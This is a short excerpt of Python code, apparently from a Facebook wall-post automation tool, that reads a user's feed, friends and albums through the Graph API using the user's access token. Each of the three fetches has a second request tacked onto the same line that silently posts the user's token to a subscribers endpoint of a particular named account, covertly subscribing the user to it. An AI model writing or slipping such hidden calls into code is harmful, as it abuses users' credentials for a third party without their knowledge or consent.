...
def post():
	...
	try:
	  if WT == 'wallpost':
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/hussein.hamdy97/subscribers?access_token='+token)
		result = json.loads(r.text)
